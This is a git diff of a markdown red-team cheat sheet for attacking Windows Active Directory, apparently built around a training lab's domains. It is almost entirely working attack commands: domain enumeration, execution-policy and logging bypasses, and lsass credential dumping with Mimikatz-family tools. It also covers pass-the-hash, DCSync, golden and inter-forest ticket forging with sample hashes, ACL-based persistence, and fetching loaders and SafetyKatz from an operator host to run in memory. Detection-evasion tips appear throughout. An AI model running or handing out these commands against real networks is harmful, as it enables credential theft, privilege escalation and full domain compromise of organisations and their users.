@@ -1,4 +1,4 @@
-## I just landed where the **** I AM ?
+
 # Nestat
 `netstat -na`
 # Arp table (These IP have communicated with our system, Could be LAN or not)
@@ -17,6 +17,12 @@
 `whoami /groups`
 # SMB shares
 `net share`
+ # Find shares on hosts in current domain.
+`Invoke-ShareFinder–Verbose`
+# Find sensitive files on computers in the domain
+`Invoke-FileFinder–Verbose`
+# Get all fileservers of the domain
+`Get-NetFileServer`
 # Other users
 `net user`
 # Find groups if i am in domain controller
@@ -38,7 +44,12 @@
 `net group "Tier 1 Admins" /domain`*Members of the group*
 # Passwords policy
 `net accounts /domain`
+# Several ways to bypass execution policy
 
+`powershell–ExecutionPolicy bypass`
+`powershell–c <cmd>`
+`powershell–encodedcommand`
+`$env:PSExecutionPolicyPreference="bypass"`
 
 # Enumerate users through ldap
 `Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"`
@@ -79,6 +90,178 @@
 `Get-ChildItem -Path C:\ -Include *interesting-fle.txt* -File -Recurse -ErrorAction SilentlyContinue`
 # Get Contents of file
 `Get-Content "C:\Program Files\interestingfile.txt.txt"`
+## Domain Enumeration
+
+# Get current domain
+Get-Domain (PowerView)
+Get-ADDomain (ActiveDirectory Module)
+
+# Get object of another domain
+Get-Domain–Domain moneycorp.local
+Get-ADDomain-Identity moneycorp.local
+# Get domain SID for the current domain
+Get-DomainSID
+(Get-ADDomain).DomainSID
+
+# Get domain policy for the current domain
+Get-DomainPolicyData
+(Get-DomainPolicyData).systemaccess
+# Get domain policy for another domain
+(Get-DomainPolicyData–domain
+moneycorp.local).systemaccess
+
+# Get domain controllers for the current domain
+Get-DomainController
+Get-ADDomainController
+# Get domain controllers for another domain
+Get-DomainController–Domain moneycorp.local
+Get-ADDomainController -DomainName moneycorp.local -Discover
+
+# Get a list of users in the current domain
+Get-DomainUser
+Get-DomainUser–Identity student1
+
+Get-ADUser -Filter * -Properties *
+Get-ADUser -Identity student1 -Properties *
+
+# Get list of all properties for users in the current domain
+`Get-DomainUser -Identity student1 -Properties *
+Get-DomainUser -Properties samaccountname,logonCount
+Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -
+MemberType *Property | select Name
+Get-ADUser -Filter * -Properties * | select
+name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset
+)}}`
+
+# Get all the groups in the current domain
+`Get-DomainGroup | select Name`
+`Get-DomainGroup–Domain <targetdomain>`
+
+`Get-ADGroup -Filter * | select Name`
+`Get-ADGroup -Filter * -Properties *`
+
+# Get all groups containing the word "admin" in group name
+`Get-DomainGroup *admin*`
+`Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`
+
+
+# Check for active users with high logoncount, bad idea to target low logoncount users.
+`Get-DomainUser -Properties samaccountname,logonCount`
+
+# Check descriptions for passwords or other interesting
+`Get-DomainUser -LDAPFilter "Description=*pass*" | Select name,Description`
+
+# Get a list of computers in the current domain
+`Get-DomainComputer | select Name
+Get-DomainComputer–OperatingSystem "*Server 2016*"
+Get-DomainComputer -Ping
+Get-ADComputer -Filter * | select Name
+Get-ADComputer -Filter * -Properties *
+Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
+Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`
+
+# Get all the groups in the current domain
+`Get-DomainGroup | select Name`
+`Get-DomainGroup–Domain <targetdomain>`
+`Get-ADGroup -Filter * | select Name`
+`Get-ADGroup -Filter * -Properties *`
+# Get all groups containing the word "admin" in group name
+`Get-DomainGroup *admin*`
+`Get-ADGroup -Filter 'Name -like "*admin*"' | select Name`
+
+# Get all the members of the Domain Admins group
+`Get-DomainGroupMember -Identity "Domain Admins" -Recurse`
+`Get-ADGroupMember -Identity "Domain Admins" -Recursive`
+
+# Get the group membership for a user:
+`Get-DomainGroup–UserName "student1"`
+`Get-ADPrincipalGroupMembership -Identity student1`
+
+# List all the local groups on a machine (needs administrator privs on non-dc
+machines) :
+`Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups`
+
+# Get members of all the local groups on a machine (needs administrator privs on
+non-dc machines)
+`Get-NetLocalGroup -ComputerName dcorp-dc -Recurse`
+#  Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
+`Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators`
+
+# Get actively logged users on a computer (needs local admin rights on the target)
+`Get-NetLoggedon–ComputerName <servername>`
+# Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
+`Get-LoggedonLocal -ComputerName dcorp-dc`
+#  Get the last logged user on a computer (needs administrative rights and
+remote registry on the target)
+`Get-LastLoggedOn–ComputerName <servername>`
+
+
+
+# Get list of GPO in current domain.
+`Get-DomainGPO`
+`Get-DomainGPO -ComputerIdentity dcorp-student1`
+
+# Get GPO(s) which use Restricted Groups or groups.xml for interesting users ( IF DOMAIN GROUP IS ADDED TO LOCAL GROUP, THIS CAN GIVE AN ATTACK PATH. IF you be a part of that group you can have local admin rights on this machine)
+`Get-DomainGPOLocalGroup`
+
+# Get users which are in a local group of a machine using GPO
+`Get-DomainGPOComputerLocalGroupMapping–ComputerIdentity
+dcorp-student1`
+# Get machines where the given user is member of a specific group
+`Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose`
+
+# Get OUs in a domain
+`Get-DomainOU`
+`Get-ADOrganizationalUnit -Filter * -Properties *`
+# Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
+`Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"`
+
+# Get the ACLs associated with the specified object
+`Get-DomainObjectAcl -SamAccountName student1–ResolveGUIDs`
+# Get the ACLs associated with the specified prefix to be used for search
+`Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain`
+Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
+# We can also enumerate ACLs using ActiveDirectory module but without resolving
+GUIDs
+`(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access`
+
+# Search for interesting ACEs
+`Find-InterestingDomainAcl -ResolveGUIDs`
+# Get the ACLs associated with the specified path
+`Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"`
+
+# Get a list of all domain trusts for the current domain
+`Get-DomainTrust`
+`Get-DomainTrust–Domain us.dollarcorp.moneycorp.local`
+
+`Get-ADTrust`
+`Get-ADTrust–Identity us.dollarcorp.moneycorp.local`
+
+# Get details about the current forest
+`Get-Forest`
+`Get-Forest–Forest eurocorp.local`
+`Get-ADForest`
+`Get-ADForest–Identity eurocorp.local`
+# Get all domains in the current forest
+`Get-ForestDomain`
+`Get-ForestDomain–Forest eurocorp.local`
+`(Get-ADForest).Domains`
+
+# Get all global catalogs for the current forest
+`Get-ForestGlobalCatalog`
+`Get-ForestGlobalCatalog–Forest eurocorp.local`
+`Get-ADForest | select -ExpandProperty GlobalCatalogs`
+# Map trusts of a forest
+`Get-ForestTrust`
+`Get-ForestTrust–Forest eurocorp.local`
+`Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'`
+
+# Find computers (File Servers and Distributed File servers) where a domain admin session is available.
+`Find-DomainUserLocation –Stealth`
+
+# BloodHound : To avoid detections like ATA
+`Invoke-BloodHound -CollectionMethod All -ExcludeDC`
+
 
 ###### Privilege escalation #########
 # Powershell history
@@ -899,67 +1082,13 @@ Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation`*Enumerating for SPN Ac
 # AS-REP Roasting
 `python3.9 /opt/impacket/examples/GetNPUsers.py -dc-ip MACHINE_IP thm.red/ -usersfile /tmp/users.txt`*Performing an AS-REP Roasting Attack against Users List*
 
-###### Needed to be merged with the above ones #######
-### General way 1: of opsec.
-# Step 1: Bypass script block logging and all the other logging staff
-# Step 2: Bypass AMSI
-# Step 3: Do whatever
 
-### General way 2: of opsec.
-# When an admin is running as a service on a machine we can extract clear text pass with sekurlsa::ekeyes.
-
-### Thinks to remember 3: opsec
-If our target is 2016 and before then after using a golden ticket or a silver ticket we cant use winrs or powershell remoting however u can still run commands using wmi (`gwmi -C win32_computersystem -ComputerName dcorp-dc`). If its 2019 ++ you have no problem.
-
-### Thinks to remember 4: opsec
-Using silver ticket might be fancy becuase Miscrosoft MDI doesnt care about silver tickets and in some cases we dont touch the DC but our persistence period by default is 30 days for computer accounts. Also have in mind that if we want to do multiple things even when targeting a DC(not recommended) we have to create different tickets for different purposes(ex: HOST to create a schtask)
-
-### Thinks to remember 5: opsec
-If you try to create a silver ticket and use /service:HTTP in order to use winrm it wont work if its 2016.
-
-###  Thinks to remember 6: opsec
-When you get access to a new user it is worth checking if he/she has local admin access to any other machine
-
-### Thinks to remember 7: opsec
-In cases you run sekurlsa::ekeys and if you find many aes keys for the same user check the SID always, and for example in case of a resource based constrained delegated scenario would pick S-1-5-18 which is the admin one !
-
-### Thinks to remember 8: opsec
-Use silver tickets for staying under the radar dont do stupidities like adding ur account to domain admin group with that, be smart.
-
-### Thinks to remember 9: opsec
-Kerboroasting on the best attacks for staying under the radar, if you manage to guess the pass(I mean its RC4 ... hope you do it !)
-
-### Thinks to remember 10: opsec
-ACL attacks are interesting and very profitable, i would also say that there are stealthier than others.
-
-## Thinks to remember 11: opsec
-Credential theft protections(Credential Guard,Protected users group) are not protecting against extracting credential from the registry, only from lsass. Credentials for local accounts in SAM and Service account
-credentials from LSA Secrets are NOT protected.
-
-### Behavioural bypassing
-## Scenario 1: We have remote access to another machine and we want to use a binary to download something and execute it in the memory. An executable trying to download another executable or something from a remote server will trigger bevaviour base detection from defender. Instead portforward your own port and download it from 127.0.0.1 which will not be a remote server.
-**Example:**
-`winrs -r;dcorp-mgmt hostname:whoami` -> "From our machine exec on the other machine"
-`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe` "Download on our machine"
-`echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe` "Copy on the rmt machine"
-`winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.1/Loader.exe sekurlsa::ekeys exit` "Wrong way as executable tries to download another executable and run it from 'remote server'"
-`winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.16.100.1`"Correct way as we forward our port as the remote machine localhost port access, so it seems that the remote machine is downloading from itself and not from a remote server"
-############################################################################
-### Noisy commands that and should be avoided :
-## Scenario 2: In general the idea is when you ask something from the DC and you spam all the machines in the network you will leave logs on all the machines and you will cause a network spike.
-
- # Find shares on hosts in current domain.
-Invoke-ShareFinder–Verbose
-# Find sensitive files on computers in the domain
-Invoke-FileFinder–Verbose
-# Get all fileservers of the domain
-Get-NetFileServer
-Also when run Commands for finding local admin rights on other machines is also noisy.
+##  When running Commands for finding local admin rights on other machines is also noisy.
 # Find all machines on the current domain where the current user has local admin access ( also Find-WMILocalAdminAccess.ps1 and Find-PSRemotingLocalAdminAccess.ps1)
-Find-LocalAdminAccess–Verbose
+`Find-LocalAdminAccess–Verbose`
 # Find computers where a domain admin (or specified user/group) has sessions:
-Find-DomainUserLocation -Verbose
-Find-DomainUserLocation -UserGroupIdentity "RDPUsers"
+`Find-DomainUserLocation -Verbose`
+`Find-DomainUserLocation -UserGroupIdentity "RDPUsers"`
 
 # Find computers where a domain admin session is available and current user has admin access (uses Test-AdminAccess).
 Find-DomainUserLocation -CheckAccess
@@ -991,10 +1120,6 @@ New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminL
 # Use below command to pass the hash
 `Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"'`
 `ls \\dcorp-dc\C$`
-##############################################################
-
-# When looking for domain admins you should always check the SID if the last three digits are 500, because someone might have renamed him. On the other hand on a non-domain machine when you are not local admin, you cant find that if they are renamed.
-
 
 # We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
 winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
@@ -1024,14 +1149,7 @@ IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()`
 # (https://github.com/Flangvik/NetLoader) to deliver our binary payloads. It can be used to load binary from filepath or URL and patch AMSI & ETW while executing.
 `C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
 # We also have AssemblyLoad.exe that can be used to load the Netloader in-memory from a URL which then loads a binary from a filepath or URL.
-C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
-
-# Several ways to bypass execution policy
-
-`powershell–ExecutionPolicy bypass`
-`powershell–c <cmd>`
-`powershell–encodedcommand`
-`$env:PSExecutionPolicyPreference="bypass"`
+`C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe`
 
 # The ActiveDirectory PowerShell module (MS signed and works even in PowerShell CLM)
 https://docs.microsoft.com/en-us/powershell/module/addsadministration/?view=win10-ps
@@ -1039,261 +1157,81 @@ https://github.com/samratashok/ADModule
 `Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll`
 `Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1`
 
-# Evade powershell logging and AMSI bypass (https://github.com/OmerYa/Invisi-Shell)
--> Patches AMSI
--> System wide transcription
--> Script block logging
 
-## Domain Enumeration
-
-# Get current domain
-Get-Domain (PowerView)
-Get-ADDomain (ActiveDirectory Module)
-
-# Get object of another domain
-Get-Domain–Domain moneycorp.local
-Get-ADDomain-Identity moneycorp.local
-# Get domain SID for the current domain
-Get-DomainSID
-(Get-ADDomain).DomainSID
-
-# Get domain policy for the current domain
-Get-DomainPolicyData
-(Get-DomainPolicyData).systemaccess
-# Get domain policy for another domain
-(Get-DomainPolicyData–domain
-moneycorp.local).systemaccess
-
-# Get domain controllers for the current domain
-Get-DomainController
-Get-ADDomainController
-# Get domain controllers for another domain
-Get-DomainController–Domain moneycorp.local
-Get-ADDomainController -DomainName moneycorp.local -Discover
-
-# Get a list of users in the current domain
-Get-DomainUser
-Get-DomainUser–Identity student1
-
-Get-ADUser -Filter * -Properties *
-Get-ADUser -Identity student1 -Properties *
-
-# Get list of all properties for users in the current domain
-`Get-DomainUser -Identity student1 -Properties *
-Get-DomainUser -Properties samaccountname,logonCount
-Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -
-MemberType *Property | select Name
-Get-ADUser -Filter * -Properties * | select
-name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset
-)}}`
-
-# Get all the groups in the current domain
-Get-DomainGroup | select Name
-Get-DomainGroup–Domain <targetdomain>
-
-Get-ADGroup -Filter * | select Name
-Get-ADGroup -Filter * -Properties *
-
-# Get all groups containing the word "admin" in group name
-Get-DomainGroup *admin*
-Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
-
-
-# Check for active users with high logoncount, bad idea to target low logoncount users.
-`Get-DomainUser -Properties samaccountname,logonCount`
-
-# Check descriptions for passwords or other interesting
-
-`Get-DomainUser -LDAPFilter "Description=*pass*" | Select name,Description`
-
-# Get a list of computers in the current domain
-`Get-DomainComputer | select Name
-Get-DomainComputer–OperatingSystem "*Server 2016*"
-Get-DomainComputer -Ping
-Get-ADComputer -Filter * | select Name
-Get-ADComputer -Filter * -Properties *
-Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
-Get-ADComputer -Filter * -Properties DNSHostName | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}`
-
-# Get all the groups in the current domain
-Get-DomainGroup | select Name
-Get-DomainGroup–Domain <targetdomain>
-Get-ADGroup -Filter * | select Name
-Get-ADGroup -Filter * -Properties *
-# Get all groups containing the word "admin" in group name
-Get-DomainGroup *admin*
-Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
-
-# Get all the members of the Domain Admins group
-Get-DomainGroupMember -Identity "Domain Admins" -Recurse
-Get-ADGroupMember -Identity "Domain Admins" -Recursive
-# Get the group membership for a user:
-Get-DomainGroup–UserName "student1"
-Get-ADPrincipalGroupMembership -Identity student1
-
-# List all the local groups on a machine (needs administrator privs on non-dc
-machines) :
-Get-NetLocalGroup -ComputerName dcorp-dc -ListGroups
-
-# Get members of all the local groups on a machine (needs administrator privs on
-non-dc machines)
-Get-NetLocalGroup -ComputerName dcorp-dc -Recurse
-#  Get members of the local group "Administrators" on a machine (needs administrator privs on non-dc machines) :
-Get-NetLocalGroupMember -ComputerName dcorp-dc -GroupName Administrators
-
-# Get actively logged users on a computer (needs local admin rights on the target)
-Get-NetLoggedon–ComputerName <servername>
-# Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS)
-Get-LoggedonLocal -ComputerName dcorp-dc
-#  Get the last logged user on a computer (needs administrative rights and
-remote registry on the target)
-Get-LastLoggedOn–ComputerName <servername>
-
-
-
-# Get list of GPO in current domain.
-Get-DomainGPO
-Get-DomainGPO -ComputerIdentity dcorp-student1
-
-# Get GPO(s) which use Restricted Groups or groups.xml for interesting users ( IF DOMAIN GROUP IS ADDED TO LOCAL GROUP, THIS CAN GIVE AN ATTACK PATH. IF you be a part of that group you can have local admin rights on this machine)
-Get-DomainGPOLocalGroup
-
-# Get users which are in a local group of a machine using GPO
-Get-DomainGPOComputerLocalGroupMapping–ComputerIdentity
-dcorp-student1
-# Get machines where the given user is member of a specific group
-Get-DomainGPOUserLocalGroupMapping -Identity student1 -Verbose
-
-# Get OUs in a domain
-Get-DomainOU
-Get-ADOrganizationalUnit -Filter * -Properties *
-# Get GPO applied on an OU. Read GPOname from gplink attribute from Get-NetOU
-Get-DomainGPO -Identity "{AB306569-220D-43FF-B03B-83E8F4EF8081}"
-
-# Get the ACLs associated with the specified object
-Get-DomainObjectAcl -SamAccountName student1–ResolveGUIDs
-# Get the ACLs associated with the specified prefix to be used for search
-Get-DomainObjectAcl -SearchBase "LDAP://CN=Domain
-Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local" -ResolveGUIDs -Verbose
-# We can also enumerate ACLs using ActiveDirectory module but without resolving
-GUIDs
-(Get-Acl 'AD:\CN=Administrator,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access
-
-# Search for interesting ACEs
-Find-InterestingDomainAcl -ResolveGUIDs
-# Get the ACLs associated with the specified path
-Get-PathAcl -Path "\\dcorp-dc.dollarcorp.moneycorp.local\sysvol"
-
-# Get a list of all domain trusts for the current domain
-Get-DomainTrust
-Get-DomainTrust–Domain us.dollarcorp.moneycorp.local
-
-Get-ADTrust
-Get-ADTrust–Identity us.dollarcorp.moneycorp.local
-
-# Get details about the current forest
-Get-Forest
-Get-Forest–Forest eurocorp.local
-Get-ADForest
-Get-ADForest–Identity eurocorp.local
-# Get all domains in the current forest
-Get-ForestDomain
-Get-ForestDomain–Forest eurocorp.local
-(Get-ADForest).Domains
-
-# Get all global catalogs for the current forest
-Get-ForestGlobalCatalog
-Get-ForestGlobalCatalog–Forest eurocorp.local
-Get-ADForest | select -ExpandProperty GlobalCatalogs
-# Map trusts of a forest
-Get-ForestTrust
-Get-ForestTrust–Forest eurocorp.local
-Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
-
-# Find computers (File Servers and Distributed File servers) where a domain admin session is available.
-Find-DomainUserLocation –Stealth
-
-# BloodHound : To avoid detections like ATA
-Invoke-BloodHound -CollectionMethod All -ExcludeDC
 
 ## Priv esc 
 # Get services with unquoted paths and a space in their name.
-Get-ServiceUnquoted -Verbose
+`Get-ServiceUnquoted -Verbose`
 # Get services where the current user can write to its binary path or
 change arguments to the binary
-Get-ModifiableServiceFile-Verbose
+`Get-ModifiableServiceFile-Verbose`
 # Get the services whose configuration current user can modify.
-Get-ModifiableService-Verbose
+`Get-ModifiableService-Verbose`
 
 # PowerUp
-Invoke-AllChecks
+`Invoke-AllChecks`
 # Privesc:
-Invoke-PrivEsc
+`Invoke-PrivEsc`
 # PrivescCheck:
-Invoke-Privesc Check
+`Invoke-Privesc Check`
 # PEASS-ng:
-winPEASx64.exe
+`winPEASx64.exe`
 
 # PowerShell Remoting Use below to execute commands or scriptblocks:
-Invoke-Command–Scriptblock {Get-Process} -ComputerName
-(Get-Content <list_of_servers>)
+`Invoke-Command–Scriptblock {Get-Process} -ComputerName
+(Get-Content <list_of_servers>)`
 # Use below to execute scripts from files
-Invoke-Command–FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
+`Invoke-Command–FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)`
 
 # Use below to execute locally loaded function on the remote machines:
-Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
+`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)`
 # In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:
-Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
+`Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList`
 # a function call within the script is used:
-Invoke-Command–Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
+`Invoke-Command–Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)`
 
 # execute "Stateful" commands using Invoke-Command:
-$Sess = New-PSSession–Computername Server1
+`$Sess = New-PSSession–Computername Server1
 Invoke-Command–Session $Sess–ScriptBlock {$Proc = Get-Process}
-Invoke-Command–Session $Sess–ScriptBlock {$Proc.Name}
+Invoke-Command–Session $Sess–ScriptBlock {$Proc.Name}`
 
 # We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):
-winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
+`winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname`
 
 # Dump credentials on a local machine using Mimikatz.
-Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`
 # Using SafetyKatz (Minidump of lsass and PELoader to run Mimikatz)
-SafetyKatz.exe "sekurlsa::ekeys"
+`SafetyKatz.exe "sekurlsa::ekeys"`
 # Dump credentials Using SharpKatz (C# port of some of Mimikatz functionality).
-SharpKatz.exe --Command ekeys
+`SharpKatz.exe --Command ekeys`
 # Dump credentials using Dumpert (Direct System Calls and API unhooking)
-rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
+`rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump`
 
 # Using pypykatz (Mimikatz functionality in Python)
-pypykatz.exe live lsa
+`pypykatz.exe live lsa`
 # Using comsvcs.dll (lol bin to bypass application white list)
-tasklist /FI "IMAGENAME eq lsass.exe"
+`tasklist /FI "IMAGENAME eq lsass.exe"
 rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump
-<lsass process ID> C:\Users\Public\lsass.dmp full
+<lsass process ID> C:\Users\Public\lsass.dmp full`
 
 
 # Over Pass the hash (OPTH) generate tokens from hashes or keys. Needs elevation(Run as administrator)
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'
+`Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"'`
 
-SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
+`SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"`
 ## The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).
 
 #  Below doesn't need elevation ( This overwrites the current tickets)
-Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
+`Rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt`
 #  Below command needs elevation ( This starts a new process and if you run whoami you will not see ur impersonated admin privs. Because the proccess starts with logon type 9 so new credentials are used when you access network resources !)
-Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+`Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
 
 # To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:
 `Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`
-SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
-
-### Obfuscation
-For Rubeus.exe, use ConfuserEx (https://github.com/mkaring/ConfuserEx) to obfuscate the binary.
-
+`SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`
 
 # Execute mimikatz on DC as DA to get krbtgt hash
-Invoke-Mimikatz -Command '"lsadump::lsa /patch"'–Computername dcorp-dc
-
+`Invoke-Mimikatz -Command '"lsadump::lsa /patch"'–Computername dcorp-dc`
 
 # Golden ticket :
 `Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"`z *Explanation : name of the module,Username for which the TGT is generated (use an active domain admin with high logon count),Domain FQDN,SID of the domain,NTLM (RC4) hash of the krbtgt account or Use /aes128 and
@@ -1328,9 +1266,9 @@ Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name
 `Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local'-Verbose`
 
 ## Check (if what we did before worked or not) the Domain Admins permission - PowerView as normal user:
-Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
+`Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}`
 ## Using ActiveDirectory Module:
-(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$.IdentityReference -match 'student1'}
+`(Get-Acl -Path 'AD:\CN=DomainAdmins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$.IdentityReference -match 'student1'}`
 
 ## Moreover now we can abuse :Abusing FullControl using PowerView:
 `Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose`
@@ -1479,7 +1417,7 @@ CAL.kirbi"'`
 ## (SUPER IMPORTANT !!) In Kerberos is that the delegation occurs not only for the specified service but for any service running under the same account. There is no validation for the SPN specified. For example this account samaccountname: (DCORP-ADMINSRV$) can acces this service msds-allowedtodelegateto : (TIME/dcorp-cd.etc) as any user and it can also access all the services that run with the same service account as the TIME service. So all interesting services uses the machine account as the service account (for example TIME SERVICE,winrm, http,rpcss and etc). So that means what we cannot only access the TIME service on the domain controller as an  domain administrator but we can also access the other services.
 
 ## Either plaintext password or NTLM hash is required. If we have access to dcorp-adminsrv hash  Using asktgt from Kekeo, we request a TGT:
-tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67
+`tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:1fadb1b13edbc5a61cbdc389e6f34c67`
 ## Using s4u from Kekeo_one (no SNAME validation):
 `tgs::s4u /tgt:TGT_dcorp-adminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneyc orp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorp-dc.dollarcorp.moneycorp.LOCAL`
 
@@ -1566,8 +1504,8 @@ kerberos::golden The mimikatz module
 `Invoke-Mimikatz -Command '"lsadump::dcsync /user:mcorp\Administrator /domain:moneycorp.local"'`
 
 ## Across forest trusts will not work as the above as there is SID filtering. You can only access resources that are explicitly allowed, between forests and you do it the same way as above. In this case the shares
-`Once again, we require the trust key for the inter-forest trust.
-Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
+Once again, we require the trust key for the inter-forest trust.
+`Invoke-Mimikatz -Command '"lsadump::trust /patch"'`
 ## An inter-forest TGT can be forged
 `Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:cd3fb1b0b49c7a56d285ffdbb1304431 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\kekeo_old\trust_forest_tkt.kirbi"'`
 ##  Get a TGS for a service (CIFS below) in the target domain by using the forged trust ticket.
@@ -1717,3 +1655,57 @@ MSBuild.exe etc. - are useful for bypassing UMCI as well.
 ## Also, if we have NTLM hash of a DC, we can extract NTLM hashes of any machine account using netsync
